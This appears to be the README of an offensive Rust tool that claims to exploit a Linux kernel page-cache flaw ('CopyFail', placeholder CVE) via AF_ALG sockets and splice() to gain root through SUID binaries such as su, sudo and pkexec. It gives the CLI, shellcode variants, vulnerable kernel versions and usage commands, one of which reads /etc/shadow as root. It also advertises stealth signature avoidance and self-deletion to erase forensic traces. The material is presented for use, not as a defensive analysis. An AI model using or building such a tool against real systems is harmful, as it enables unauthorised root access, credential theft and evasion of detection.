# CopyFail Exploit

A sophisticated Linux kernel exploit implementation targeting the **CopyFail** vulnerability (CVE-2024-XXXX). This vulnerability affects the page cache corruption through the AF_ALG socket interface combined with splice operations.

## Features

### Advanced Exploit Capabilities

- **Multiple Target Binaries**: Supports exploiting various SUID binaries:
  - `/usr/bin/su` (default)
  - `/usr/bin/sudo`
  - `/usr/bin/pkexec`
  - Custom paths via `--target`

- **Retry Logic**: Automatic retry mechanism for failed injection chunks with configurable delay

- **Stealth Mode**: Minimal output and signature avoidance for quieter execution

- **Architecture Support**: Payload generation for multiple architectures:
  - x86_64 (64-bit)
  - x86 (32-bit)
  - AArch64 (ARM64)

- **Shellcode Variants**:
  - `standard`: setuid(0) + execve + exit
  - `minimal`: execve only (assumes already root)
  - `stealth`: setuid(0) + setgid(0) + execve + exit

### Command-Line Interface

```
CopyFail Exploit v1.0.0

USAGE:
    oct26 [OPTIONS] [COMMAND]

OPTIONS:
    -t, --target <BIN>    Target SUID binary (su|sudo|pkexec|<path>)
    -c, --chunk-size <N>  Injection chunk size in bytes (default: 4)
    -r, --retries <N>     Maximum retries per chunk (default: 3)
    -s, --silent          Silent mode (minimal output)
    -v, --verbose         Verbose/debug output
    --stealth             Stealth mode (avoid certain signatures)
    --verify              Verify page cache injection
    --dry-run             Show what would be done without exploiting
    --scan                Scan for available SUID binaries
    --arch <ARCH>         Target architecture (x86_64|x86|aarch64)
    --variant <VAR>       Shellcode variant (standard|minimal|stealth)
    -V, --version         Print version
    -h, --help            Print this help message
```

## Usage Examples

```bash
# Run with defaults (executes "id" as root)
./oct26

# Execute a specific command
./oct26 "whoami"

# Execute a complex command
./oct26 "/bin/sh -c 'cat /etc/shadow'"

# Target a different SUID binary
./oct26 --target sudo "id"

# Use a custom binary path
./oct26 --target /custom/path/to/binary "id"

# Scan for available SUID binaries
./oct26 --scan

# Dry run (test without exploiting)
./oct26 --dry-run

# Silent execution
./oct26 -s "id"

# Verbose with increased retries
./oct26 -v --retries 5 "id"

# Adjust chunk size for specific kernel versions
./oct26 --chunk-size 8 "id"
```

## Vulnerable Kernels

The following Linux kernel versions are known to be vulnerable:

| Kernel Version | Vulnerable |
|----------------|------------|
| 4.14 - 4.20    | Yes        |
| 5.0 - 5.9      | Yes        |
| 5.10           | < 5.10.254 |
| 5.11 - 5.14    | Yes        |
| 5.15           | < 5.15.204 |
| 5.16 - 5.19    | Yes        |
| 6.0            | Yes        |
| 6.1            | < 6.1.170  |
| 6.2 - 6.5      | Yes        |
| 6.6            | < 6.6.137  |
| 6.7 - 6.11     | Yes        |
| 6.12           | < 6.12.85  |

## Building

```bash
# Debug build
cargo build

# Release build (optimized for size)
cargo build --release

# Cross-compile for Linux from macOS
rustup target add x86_64-unknown-linux-gnu
cross build --target x86_64-unknown-linux-gnu --release
```

## How It Works

1. **Payload Generation**: Creates a minimal ELF executable with embedded shellcode that:
   - Calls `setuid(0)` to ensure root privileges
   - Executes the specified command via `/bin/sh -c`
   - Cleans up with `exit(0)`

2. **Page Cache Corruption**: Uses the AF_ALG socket interface to:
   - Bind to the `authencesn(hmac(sha256),cbc(aes))` algorithm
   - Configure cryptographic parameters with specific key values
   - Use `splice()` to move data from the target binary through a pipe into the crypto socket
   - Trigger the vulnerability that corrupts the page cache

3. **Exploitation**: After injection, executing the target binary (e.g., `su`) runs from the corrupted page cache, executing the injected shellcode with root privileges.

4. **Self-Destruction**: The exploit removes itself after execution to minimize forensic artifacts.

## Architecture

```
oct26/
├── src/
│   ├── main.rs              # CLI parsing and main entry point
│   └── copyfail/
│       ├── mod.rs           # Module declarations
│       ├── exp.rs           # Exploit logic with retry mechanism
│       ├── elf.rs           # Multi-architecture ELF payload builder
│       └── logger.rs        # Logging abstraction
├── Cargo.toml
└── README.md
```

## Dependencies

- `sysinfo`: System information retrieval
- `libc`: Low-level system calls (socket, splice, etc.)
- `log`: Logging framework